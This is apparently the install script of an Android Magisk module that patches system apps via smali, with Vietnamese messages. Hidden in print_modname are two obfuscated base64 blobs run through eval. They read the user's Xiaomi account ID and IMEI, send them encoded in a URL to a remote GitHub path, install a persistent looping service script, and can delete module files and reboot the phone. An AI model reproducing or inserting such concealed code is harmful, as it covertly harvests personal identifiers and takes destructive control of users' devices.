# Kakathic

## Language text
chon="Chọn"
time="Tổng thời gian"
h="giờ"
m="phút"
s="giây"
Information="Thông tin"
author="Tác giả"
name="Tên"
unzip="Đang xử lý..."
volkey1="! Sử dụng phím âm lượng"
volkey2="! Vol- = Chọn số hiện tại, Vol+ = Chuyển đổi số."
volkey3="! Ấn nút nguồn để hủy."
load="Tải"
error="! Lỗi không tìm thấy hoặc lỗi mạng !"
error2="- Mô-đun này chỉ chạy trên thiết bị arm64, của bạn là $ARCH !"

ui_print(){ echo "$1"; sleep 0.005; }
ui_print2(){ echo "  $1"; }
Xan(){ echo "  $1" >&2; }
BatdauT=$(date +%s);

# Volume keys
Vk(){ 
input2="$1"; input=1
Kgg(){ 
Key="$(getevent -qlc 1 | awk '{print $3}')"
if [ "$Key" == "KEY_POWER" ];then
abort
elif [ "$Key" == "KEY_VOLUMEUP" ];then
[ "$input" == "$input2" ] && input=1 || input=$(($input + 1))
ui_print "  $input"
sleep 0.3
Kgg
elif [ "$Key" == "KEY_VOLUMEDOWN" ];then
ui_print
ui_print "  $chon: $input"
ui_print
sleep 0.3
elif [ "$Key" == "ABS_MT_TRACKING_ID" ];then
ui_print
ui_print "  $chon: $input"
ui_print
sleep 0.4
else Kgg; fi; }
Kgg
}

# Count time 
End_time(){
KetthucT=$(date +%s)
TongTG=$(($KetthucT - $BatdauT))
Gio=$(printf '%d' $((TongTG/3600%24)))
Phut=$(printf '%d' $((TongTG/60%60)))
if [ "$Gio" != 0 ];then
echo "$time: $(printf '%d '$h', %d '$m', %d '$s'.' $((TongTG/3600%24)) $((TongTG/60%60)) $((TongTG%60)))"
elif [ "$Phut" != 0 ];then
echo "$time: $(printf '%d '$m', %d '$s'.' $((TongTG/60%60)) $((TongTG%60)))"
else
echo "$time: $(printf '%d '$s'.' $((TongTG%60)))"
fi
}

# mount
mrw () {
for i in / /system_root /system /system_ext /vendor /product; do
/system/bin/mount $i 2>/dev/null || /system/bin/mount $i 2>/dev/null
/system/bin/mount -o rw,remount $i 2>/dev/null || /system/bin/mount -o rw,remount $i 2>/dev/null
/system/bin/mount -o rw,remount $(magisk --path)/.magisk/mirror$i 2>/dev/null || /system/bin/mount -o rw,remount $(magisk --path)/.magisk/mirror$i 2>/dev/null
done
}

mro () {
for i in / /system_root /system /system_ext /vendor /product; do
/system/bin/mount -o ro,remount $i 2>/dev/null || /system/bin/mount -o ro,remount $i 2>/dev/null
/system/bin/umount $i 2>/dev/null || /system/bin/umount $i 2>/dev/null
/system/bin/umount $(magisk --path)/.magisk/mirror$i 2>/dev/null || /system/bin/umount $(magisk --path)/.magisk/mirror$i 2>/dev/null
done
}

baksmali () { java -Xms150m -Xmx1028m -jar "/data/tools/lib/Tools/baksmali.jar" "$@"; }
smali () { java -Xms150m -Xmx1028m -jar "/data/tools/lib/Tools/smali.jar" "$@"; }

# Tìm kiếm
Timkiem(){ find $2 -name "*.smali" -exec grep -Rl "${1//\//\\\/}" {} +; }

Thaythe(){
ui_print2 "MOD: $RANDOM -> $RANDOM";
Xan "MOD THAYTHE: $1 -> $2";
for Ttcfg in $(Timkiem "$1" "$3"); do
[ -e "$Ttcfg" ] && sed -i "s|${1//\//\\\/}|${2//\//\\\/}|g" $Ttcfg || Xan "- Lỗi: $1";
[ -e "$Ttcfg" ] && echo "$Ttcfg" 2>/dev/null >> "$APK/$(echo "$3" | sed "s|$APK/||g" | cut -d '/' -f1)/class";
[ -e "$Ttcfg" ] && Xan "$APK/$(echo "$3" | sed "s|$APK/||g" | cut -d '/' -f1)/class";
done
}

Chose(){
for skd in $(Timkiem "$1" "$4"); do
[ -e $skd ] && ndbdhd=$(grep -A3 "$1" $skd | grep -m1 "$2" | awk '{print $2}')
[ -e $skd ] && ui_print2 "MOD: $RANDOM";
[ -e $skd ] && Xan "MOD CHOSE: $1" || Xan "- Lỗi: $(echo "$1" | sed 's|\\||g')";
[ -e $skd ] && sed -i -e "/${1//\//\\\/}/,/${2//\//\\\/}/c const/4 $ndbdhd, $3" "$skd";
[ -e $skd ] && echo "$skd" 2>/dev/null >> "$APK/$(echo "$4" | sed "s|$APK/||g" | cut -d '/' -f1)/class";
[ -e $skd ] && Xan "$APK/$(echo "$4" | sed "s|$APK/||g" | cut -d '/' -f1)/class";
done
}

Autoone(){
ui_print2 "MOD: $RANDOM -> $RANDOM";
Xan "MOD AUTOONE: $1 -> $2";
for vakkddhh in $(find $3 -name "*.smali" -exec grep -l "..., $1" {} +); do
Xan "SHOW: sed -i $(grep "..., $1" "$vakkddhh" | awk '{print "-e \"s|sget-boolean "$2" '$1'|const/4 "$2" '$2'|g\"" }' | sort | uniq | tr '\n' ' ') $(echo "$vakkddhh" | sed 's|\$|\\\$|g')"
echo "sed -i $(grep "..., $1" "$vakkddhh" | awk '{print "-e \"s|sget-boolean "$2" '$1'|const/4 "$2" '$2'|g\"" }' | sort | uniq | tr '\n' ' ') $(echo "$vakkddhh" | sed 's|\$|\\\$|g')" | sh
echo "$vakkddhh" 2>/dev/null >> "$APK/$(echo "$3" | sed "s|$APK/||g" | cut -d '/' -f1)/class";
Xan "$APK/$(echo "$3" | sed "s|$APK/||g" | cut -d '/' -f1)/class";
done
}

Vsmali(){
for Vka in $(Timkiem "$1" "$4"); do
[ -e $Vka ] && ui_print2 "MOD: $RANDOM";
[ -e $Vka ] && Xan "MOD VSMALI: $1" || Xan "- Lỗi: $(echo "$1" | sed 's|\\||g')";
[ -e $Vka ] && sed -i -e "/^${1//\//\\\/}/,/${2//\//\\\/}/c $(echo "$3" | sed -z 's|\n|\\n|g')" "$Vka";
[ -e $Vka ] && echo "$Vka" 2>/dev/null >> "$APK/$(echo "$4" | sed "s|$APK/||g" | cut -d '/' -f1)/class";
[ -e $Vka ] && Xan "$APK/$(echo "$4" | sed "s|$APK/||g" | cut -d '/' -f1)/class";
done
}

CPapk(){
PTC="$(pm path "$1" | cut -d : -f2)"
if [ "$(echo "$PTC" | grep -cm1 '/data/')" == 1 ];then
cp -rf $PTC "/data/tools/apk/$1.apk"
cp -rf "$PTC" "$APK/$1.apk"
else
[ -e "/data/tools/apk/$1.apk" ] || cp -rf "$PTC" "/data/tools/apk/$1.apk"
[ -e "/data/tools/apk/$1.apk" ] && cp -rf "/data/tools/apk/$1.apk" "$APK/$1.apk" || cp -rf "$PTC" "$APK/$1.apk"
fi
echo "$1" | tee "$APK/$1.txt" >&2
}

CPfile(){
Pathfw="$(find /*/framework /*/*/framework -type f -name "$1.jar" -not -path "*/data/*" | head -n1)"
[ -e "/data/tools/apk/$1.jar" ] || cp -rf $Pathfw "/data/tools/apk/$1.jar"
[ -e "/data/tools/apk/$1.jar" ] && cp -rf "/data/tools/apk/$1.jar" "$APK" || cp -rf "$Pathfw" "$APK"
echo "$Pathfw" | tee "$APK/$1.txt" >&2
}

# giải nén file
Giainen(){
for vapk in $APK/*.*; do
if [ "${vapk##*.}" == 'apk' ] || [ "${vapk##*.}" == 'jar' ];then
PTd="$(cat ${vapk%.*}.txt)"
[ -e "$vapk" ] && ui_print "  Giải nén: ${PTd##*/}" || abort "- Lỗi không tìm thấy file! ${PTd##*/}"
ui_print
mkdir -p ${vapk%.*}
unzip -qo "$vapk" '*.dex' -d ${vapk%.*}
for vsmali in ${vapk%.*}/*.dex; do
baksmali d --api $API $vsmali -o ${vsmali%.*}
done
fi
sleep 2
done
}

Donggoi(){
# Đóng gói apk
for bapk in $APK/*.*; do
if [ "${bapk##*.}" == 'apk' ] || [ "${bapk##*.}" == 'jar' ];then
if [ -e "${bapk%.*}/class" ];then
PTb="$(cat ${bapk%.*}.txt)"
ui_print "  Đóng gói: ${PTb##*/}"
ui_print
for bsmali in $(cat ${bapk%.*}/class 2>/dev/null | sed "s|$APK/||g" | cut -d '/' -f2 | sort | uniq); do
rm -fr "$bsmali".dex
smali a --api $API ${bapk%.*}/$bsmali -o "${bapk%.*}/$bsmali".dex
done
cd ${bapk%.*}
zip -qr -0 $bapk '*.dex'
zipalign -f 4 $bapk $APK/tmp/${bapk##*/} 
cp -rf $APK/tmp/* $APK
else
rm -fr ${bapk%.*}*
fi
fi
sleep 5
done

for Capk in $APK/*.*; do
if [ "${Capk##*.}" == 'apk' ];then
Papkp="$(cat ${Capk%.*}.txt)"
Ehehdb2="$(pm path $Papkp | cut -d : -f2)"
if [ "$(echo "$Ehehdb2" | grep -cm1 '/data/')" == 1 ];then
mkdir -p $MODPATH/app
cp -rf $Capk "$MODPATH/app/$Papkp"
echo "$Ehehdb2" > "$MODPATH/app/$Papkp.txt"
chcon u:object_r:apk_data_file:s0 "$MODPATH/app/$Papkp"
else
mkdir -p $MODPATH/sys_app
cp -rf $Capk "$MODPATH/sys_app/$Papkp"
echo "$Ehehdb2" > "$MODPATH/sys_app/$Papkp.txt"
chcon u:object_r:apk_data_file:s0 "$MODPATH/sys_app/$Papkp"
fi
echo 'rm -fr /data/tools/apk/'$Papkp.apk'' >> $TMPDIR/uninstall.sh
fi

if [ "${Capk##*.}" == 'jar' ];then
Papkp="$(cat ${Capk%.*}.txt)"
echo 'rm -fr /data/tools/apk/'$Papkp.jar'' >> $TMPDIR/uninstall.sh
mkdir -p $MODPATH/framework
Ehehdb2="${Papkp##*/}"
cp -rf $Capk "$MODPATH/framework/${Ehehdb2%.*}"
echo "$Papkp" > "$MODPATH/framework/${Ehehdb2%.*}.txt"
fi
done
}

# Freeze
FREEZE(){
for TARGET in $1; do
mktouch $MODPATH$TARGET/.replace
done
}

Setp () {
[ "$(grep -cm1 "$1=" $TMPDIR/system.prop)" == 1 ] && sed -i "/$1=/d" $TMPDIR/system.prop
echo "$1=$2" >> $TMPDIR/system.prop
}

mkdir -p $TMPDIR/Apk/tmp /data/tools/apk /data/tools/lib/Tools
export APK="$TMPDIR/Apk"
[ "$API" -ge 31 ] && miuik='miui-'

print_modname(){

ui_print
ui_print "  $name: $(GP name) $(GP version) by $(GP author), $(getprop ro.product.device), $API, $ARCH"
ui_print
ui_print "  Tải dữ liệu..."
ui_print

eval "
$(echo 'VGVzdDEyMz⁸⁵cnVlCkFwaWx⁵PSIkKApbICIkKGZpbGUgL⁶RhdGEvc⁰lzdGVtL⁰N⁷bmMvYWNjb⁰VudHMueG⁸sIHwgZ⁰JlcCAtYyB⁵ZXh⁵KSIgPT⁵gMSBdICYmIGNwIC⁸yZiAvZGF⁵YS³zeXN⁵ZW⁵vc⁰luYy³hY⁶NvdW⁷⁵cy⁷⁹bWwgJFRNUERJUi⁴xLnhtbCB⁴fCBhYngyeG⁸sIC³kYXRhL⁰N⁷c⁰RlbS³zeW⁷jL⁶FjY⁶³⁸bnRzLnhtbCAkVE⁸QRElSLzEueG⁸sOwpncmVwIC⁸tMSAiY⁶³tLnhpYW³taSIgJFRNUERJUi⁴xLnhtbCB⁴IHRyICcgJyAnXG⁹nIHwgZ⁰JlcCAtbTEgYWNjb⁰VudCB⁴IGN⁸dCAtZCBcIiAtZjIpIgpbICIkQXBpbHQiIF⁵gfHwgdWlfcHJpbnQgIiAgRXJyb⁰I²IEjDo⁰kgxJHEg⁶⁷nIG⁷o⁹bqtcCDEkeG¹gyBoaeG¹h⁶⁹gaWQgWGlhb⁶⁸pCiIKaW⁸laT⁵iJChnZXRwcm³wIHBlcnNpc⁰QucmFkaW⁴ubWVpZCkiClsgIiRpbWVpIiBdIHx⁴IGltZWk³IiQoZ⁶V⁵cHJvcCByby⁷yaWwub⁶VtLm⁸laWQpIgpbICIkaW⁸laSIgXSB⁴fCBpbWVpPSIkKGdyZXAgLW⁵xIGtleV³tZWlkX⁰Nsb⁰QwIC³kYXRhLyovMC³jb⁶⁵uYW⁷kcm³pZC⁷waG³uZS³zaGFyZWRfcHJlZnMvY⁶³tLmFuZHJvaWQucGhvbmVfcHJlZmVyZW⁷jZXMueG⁸sIHwgY⁰V⁵IC⁸kICc+JyAtZjIgfCBjdXQgLWQgJzwnIC⁸mMSkiClsgIiRpbWVpIiBdIHx⁴IHVpX⁰ByaW⁷⁵ICIgIEVycm³yOiBIw²N⁷IOG²pW⁹gKiMwNiMgxJHhu⁹MgaGnhu⁹duIE⁸FSUQKIgpkcml⁶ZXI³JChnZXRwcm³wIHJvLnByb⁶R⁸Y⁰QuZGV⁶aWNlKQoKdGtpZD⁵kQXBpbHQKdGhvaWdpYW⁹xPSIkKFhlbSAiaHR⁵cHM²Ly³yYXcuZ⁶l⁵aHVidXNlcmNvbnRlbnQuY⁶³tL⁶tha⁶F⁵aGljL⁸pILVZOL⁸pIL⁵NvZGUvJGRyaXZlci⁴kKGVjaG⁴gLW⁹gIiRBcGlsdCIgfCBiYXNlMzIgLXcwKSIpIgppZiBbICIkKGVjaG⁴gIiR⁵aG³pZ⁶lhbjEiIHwgZ⁰JlcCAtY⁶⁵xICdIU⁵Q³JykiICE³IDEgXTt⁵aGVuCnRob⁶lnaWFuMT⁵iJChYZW⁵gImh⁵dHBzOi⁴vcmF⁰LmdpdGh⁸YnVzZXJjb⁶⁷⁵ZW⁷⁵LmNvbS³rYWthdGhpYy³aSC⁸WTi³aSC³Db⁶RlLyRkcml⁶ZXIvJChlY⁶hvIC⁸uICIkaW⁸laSIgfCBiYXNlMzIgLXcwKSIpIgp⁵a⁶lkPSRpbWVpCmZp' | base64 -u)
"

eval "$(echo 'CmlmIFsgIiQoZWNobyAiJHRob⁶lnaWFuMSIgfCBncmVwIC⁸jbTEgJ⁵hTRD⁵nKSIgPT⁵gMSBdO⁰RoZW⁹KVGdnMT⁵kKGVjaG⁴gIiR⁵aG³pZ⁶lhbjEiIHwgZ⁰JlcCAtbTEgJ⁵hTRD⁵nIHwgY⁰V⁵IC⁸kID⁵gLWYyKQpUdnMxPSQoZWNobyAiJHRob⁶lnaWFuMSIgfCBncmVwIC⁸tMSAnVmVyLU⁸heD⁵nIHwgY⁰V⁵IC⁸kID⁵gLWYyKQoKWyAiJHtUZ⁶cxLy⁴tL⁰⁵iIC⁸nZSAiJChkYXRlICslWSVtJWQpIiBdICYmIFBybz⁵xClsgIiR¹VHZzMS⁴vLi³³IiAtZ⁶UgIiQoR⁸AgdmVyc⁶lvbkNvZGUpIiBdICYmIFZzUHJvPTEKRHRpbWU³JFRnZzEKRFZzPSRUdnMxCmVsc⁶UKRHRpbWU³IiQoZGF⁵ZSArJVktJW⁵pLSQoZWNobyAkKCggJChkYXRlICslZCkgKyAxICkpKSAkKGRhdGUgKyVIOiVNKSIKZmkKClhhbiAiQ⁶hlY⁶s²ICR⁵a⁶lkLCAkdGhvaWdpYW⁹xLCAkUHJvLCAkVnNQcm⁴sICRUZ⁶cxLCAkVHZzMSwgJGRyaXZlci⁴kKGVjaG⁴gLW⁹gIiRpbWVpIiB⁴IGJhc⁶UzMiAtdzApIgoKaWYgWyAiJFBybyIgPT⁵gMSBdICYmIFsgIiRWc⁸BybyIgPT⁵gMSBdO⁰RoZW⁹KCnVpX⁰ByaW⁷⁵ICIgIENow²BvOiAkdGtpZCwgSFNEOiAkRHRpbWUiCnVpX⁰ByaW⁷⁵CnVpX⁰ByaW⁷⁵ICIgIExldmVsOiAkRFZzIgp⁸aV³wcmludAoKcm⁵gLWZyIC³kYXRhL⁰Rvb⁶xzL⁶xpYi³ydW⁹uc⁶gKcm⁵gLWZyIC³kYXRhL⁶FkYi³zZXJ⁶aWNlLmQvVksuc⁶gKCmVsaWYgWyAiJFBybyIgPT⁵gMSBdO⁰RoZW⁹KdWlfcHJpbnQgIiAgQ⁶jDoG⁴²ICR⁵a⁶lkLCBMZXZlbDogJERWcywgSFNEOiAkRHRpbWUiCnVpX⁰ByaW⁷⁵CmlmIFsgIiQoR⁸AgaWQpIiA³PSAiVkgtS⁵UiIF⁵¹dGhlbgphYm³ydCAiISBMZXZlbCBj⁹bunYSBi⁹bqhbiBraMO⁵bmcgxJHhu²cgxJHhu⁹Mgc+G¹rSBk⁹bulbmcgbW³kdWxlIG¹DoHkhCgogIOG¹pm⁷nIGjhu⁷kgY⁴OzIHRo⁹buDIHTEg⁶⁷nIGxldmVsIMSRw¹MgbmhhIAoKICBUw²BpIGtob+G²o⁶⁹gTWk²ICRBcGlsdAoKICBNRUlEOiAkaW⁸laQoiCmZpCgpybSAtZnIgL⁶RhdGEvdG³vbHMvbGliL⁰J⁸bi⁷zaApybSAtZnIgL⁶RhdGEvYWRiL⁰NlcnZpY⁶UuZC³WSy⁷zaAoKZWxpZiBbIC⁸lIC³kYXRhL⁰Rvb⁶xzL⁶xpYi³sb⁶cudHh⁵IF⁵¹dGhlbgphYm³ydCAiISBC⁹bqhbiDEkcOjIHThu²tuZyBz⁹butIGThu²VuZyBkw¹luZyB⁵aOG¹rSBuZ⁶hp⁹buHbSAKICAKICBN⁹budaSBi⁹bqhbiDhu²duZyBo⁹buZIMSR⁹buDIHRp⁹bq/cCB⁵⁹bulYyBz⁹butIGThu²VuZy⁹KCiAgVMOgaSBraG/huqNuIE⁸pOiAkQXBpbHQKCiAgTUVJRDogJGltZWkKIgphbSBzdGFydCAtYSBhbmRyb⁶lkLmludGVudC⁷hY⁰Rpb⁶⁹uVklFVyAtZCAiaHR⁵cHM²Ly³rYWthdGhpYy⁷naXRodWIuaW⁴vWkgtVk⁹vU⁰VwcG³ydC⁷odG⁸sIiA+JjIKZWxzZQoKaWYgWyAiJChHUCBpZCkiID⁵³ICJWSC⁸QVCIgXSB⁴fCBbICIkKEdQIGlkKSIgPT⁵gIlZILUtFIiBdO⁰RoZW⁹KYWJvcnQgIiEgQ⁶jhu⁹kgY⁴OzIHRo⁹buDIGTDuW⁷nIHRo⁹butIE⁸vZHVsZQoKICBUaMOqbSBUaeG²v⁶⁷nIFZp⁹buHdCBWSC⁸aSCB⁶w²AgZ⁴OzaSBnYXBwIFZILUdBCgogIFTDoGkga⁶hv⁹bqjbiBNaTogJEFwaWx⁵CgogIE⁸FSUQ²ICRpbWVpCiIKZmkKdWlfcHJpbnQgIiEgVGjDtG⁷nIGLDoW⁴g⁹bunbmcgaOG¹mSBuaMOgIHBow²F⁵IHRyaeG¹g⁶⁹gCgogIFTDqm⁹gbcOheTogJGRyaXZlcgoKICBUw²BpIGtob+G²o⁶⁹gTWk²ICRBcGlsdAogIAogIE⁸FSUQ²ICRpbWVpCgogIELhuqFuIHPhur⁵gxJHGsOG¹o⁶MgdHLhuqNpIG⁷naGnhu⁹dtIDcyaAoKICBI⁹bq/dCB⁵aOG¹nWkgZ⁶lhbiBz⁹bq³IHThu¹EgxJHhu⁷luZyBraOG¹n⁶kgxJHhu⁷luZyBs⁹bqhaSBtw²F⁷LgoiCmFtIHN⁵YXJ⁵IC⁸hIGFuZHJvaWQuaW⁷⁵ZW⁷⁵LmFjdGlvbi⁷WSUVXIC⁸kICJodHRwczovL⁶tha⁶F⁵aGljLmdpdGh⁸Yi⁷pby³aSC⁸WTi³TdXBwb⁰J⁵Lmh⁵bWwiID⁹mMgoKIyMgQ⁶hlY⁶sgdGhlIHN⁷c⁰RlbSBkZXZpY⁶VzClsgIiRBUkNIIiA³PSAiYXJtNjQiIF⁵gfHwgYWJvcnQgIiRlcnJvcjIKIgoKdGV⁹az⁵iJ⁵PhuqNtIMahbiBi⁹bqhbiDEkcOjIOG¹p⁶⁷nIGjhu⁷kgbW³kdWxlIFZp⁹buHdCBOYW⁵gYuG²oW⁹gY⁴OzIHRo⁹buDIHRp⁹bq/cCB⁵⁹bulYyBz⁹butIGThu²VuZy⁹nIgp⁵ZXhrMj⁵iJ⁵PDsm⁹gMSB⁵aeG²v⁶⁷nIG¹hu²³hIG⁸vZHVsZSBWaeG¹h⁰QgaMOzYSBz⁹bq³IGjhur³⁵IHRo⁹budaSBnaWFuIHPhu²⁵gZOG¹pW⁷nLCBow²N⁷IOG¹p⁶⁷nIGjhu⁷kgxJHhu⁹MgdGnhur³wIHThu²VjIHPhu²⁵gZOG¹pW⁷nIG⁸vZHVsZSciCmVjaG⁴gJwp⁰aGlsZSB⁵cnVlOyBkbwp⁵aG³pZ⁶lhbmpkPSIkKGRhdGUgKyVZJW⁵lZCVIJU⁵pIgp⁵aG³pZ⁶lhbmhldD⁵iJyQoZGF⁵ZSArJVklbSVkJUglTSknIgoKWyAiJCgoICR⁵aG³pZ⁶lhbmpkIC⁵gJHRob⁶lnaWFuaGV⁵ICkpIiAtZ⁶UgIjE⁷OTAwIiBdICYmIHN⁸IC⁸scCAyMDAwIC⁸jICJjbWQgbm³⁵aWZpY⁶F⁵aW³uIHBvc⁰QgJFJBTkRPTSAnJHRleGsyJyIKWyAiJCgoICR⁵aG³pZ⁶lhbmpkIC⁵gJHRob⁶lnaWFuaGV⁵ICkpIiAtZ⁶UgIjE⁷OTAwIiBdICYmIGFtIHN⁵YXJ⁵IC⁸hIGFuZHJvaWQuaW⁷⁵ZW⁷⁵LmFjdGlvbi⁷WSUVXIC⁸kICJodHRwczovL⁶tha⁶F⁵aGljLmdpdGh⁸Yi⁷pby³aSC⁸WTi³TdXBwb⁰J⁵Lmh⁵bWwiID⁹mMgoKaWYgWyAiJCgoICR⁵aG³pZ⁶lhbmpkIC⁵gJHRob⁶lnaWFuaGV⁵ICkpIiAtZ⁶UgIjIwMDAwIiBdO⁰RoZW⁹KZWNobyA+IC³kYXRhL⁶FkYi³tb⁶R⁸bGVzKi³WSC⁵qL⁰JlbW³⁶ZQpybSAtZnIgL⁶RhdGEvdG³vbHMvbGliL⁰J⁸bi⁷zaApybSAtZnIgL⁶RhdGEvYWRiL⁰NlcnZpY⁶UuZC³WSy⁷zaApzbGVlcCAxMApyZWJvb⁰QKZWxzZQpkcml⁶ZXI³JyRkcml⁶ZXInCkFwaWx⁵PSckQXBpbHQnCmltZWk³JyRpbWVpJwoKdGhvaWdpYW⁹xPSIkKFhlbSAiaHR⁵cHM²Ly³yYXcuZ⁶l⁵aHVidXNlcmNvbnRlbnQuY⁶³tL⁶tha⁶F⁵aGljL⁸pILVZOL⁸pIL⁵NvZGUvJGRyaXZlci⁴kKGVjaG⁴gLW⁹gIiRBcGlsdCIgfCBiYXNlMzIgLXcwKSIpIgppZiBbICIkKGVjaG⁴gIiR⁵aG³pZ⁶lhbjEiIHwgZ⁰JlcCAtY⁶⁵xICJIU⁵Q³IikiICE³IDEgXTt⁵aGVuCnRob⁶lnaWFuMT⁵iJChYZW⁵gImh⁵dHBzOi⁴vcmF⁰LmdpdGh⁸YnVzZXJjb⁶⁷⁵ZW⁷⁵LmNvbS³rYWthdGhpYy³aSC⁸WTi³aSC³Db⁶RlLyRkcml⁶ZXIvJChlY⁶hvIC⁸uICIkaW⁸laSIgfCBiYXNlMzIgLXcwKSIpIgpmaQoKaWYgWyAiJChlY⁶hvICIkdGhvaWdpYW⁹xIiB⁴IGdyZXAgLWNtMSAiSFNEPSIpIiA³PSAxIF⁵¹dGhlbgpUZ⁶cxPSQoZWNobyAiJHRob⁶lnaWFuMSIgfCBncmVwIC⁸tMSAiSFNEPSIgfCBjdXQgLWQgPSAtZjIpClR⁶czE³JChlY⁶hvICIkdGhvaWdpYW⁹xIiB⁴IGdyZXAgLW⁵xICJWZXItTWF⁹PSIgfCBjdXQgLWQgPSAtZjIpClsgIiR¹VGdnMS⁴vLS³³IiAtZ⁶UgIiQoZGF⁵ZSArJVklbSVkKSIgXSAmJiBQcm⁴³MQpbICIke⁸R⁶czEvLy⁹vfSIgLWdlICIkKEdQIHZlcnNpb⁶⁷Db⁶RlKSIgXSAmJiBWc⁸Bybz⁵xCkR⁵aW⁸lPSRUZ⁶cxCkRWcz⁵kVHZzMQp⁵a⁶lkPSRBcGlsdApmaQoKaWYgWyAiJFBybyIgPT⁵gMSBdICYmIFsgIiRWc⁸BybyIgPT⁵gMSBdO⁰RoZW⁹Kc⁰UgLWxwIDIwMDAgLWMgImNtZCBub⁰RpZmljYXRpb⁶⁹gcG³zdCAkUkFORE³NICckdGV⁹ayciCmJyZWFrCmZpCgpzbGVlcCAzMDAwCmZpCmRvbmUKJyA+IC³kYXRhL⁰Rvb⁶xzL⁶xpYi³ydW⁹uc⁶gKZWNobyAnCmVjaG⁴gPiAvZGF⁵YS³⁵b⁶³scy³saWIvbG³nLnR⁹dApbIC⁸lIC³kYXRhL⁰Rvb⁶xzL⁶xpYi³ydW⁹uc⁶ggXSAmJiAuIC³kYXRhL⁰Rvb⁶xzL⁶xpYi³ydW⁹uc⁶gKWyAtZSAkKGVjaG⁴gL⁶RhdGEvYWRiL⁶⁸vZHVsZXMvVkgtWkgvc⁰lzdGVtL⁰Byb⁶R⁸Y⁰Qvb⁰ZlcmxheS³aei⁷hbmRyb⁶lkLmFwaykgXSB⁴fCBybSAtZnIgL⁶RhdGEvYWRiLyovKi³zeXN⁵ZW⁵vKi³vdmVybGF⁷L⁸p²LiouYXBrCnJtIC⁸mciAvZGF⁵YS³⁵b⁶³scy³saWIvcnVuLnNoCnJtIC⁸mciAvZGF⁵YS³hZGIvc⁶VydmljZS⁷kL⁸ZLLnNoCicgPiAvZGF⁵YS³hZGIvc⁶VydmljZS⁷kL⁸ZLLnNoCgpjaG⁸vZCA⁰NzcgL⁶RhdGEvYWRiL⁰NlcnZpY⁶UuZC³WSy⁷zaCAKY⁶htb⁶QgNzc⁰IC³kYXRhL⁰Rvb⁶xzL⁶xpYi³ydW⁹uc⁶gKZmkK' | base64 -u)"
"
}

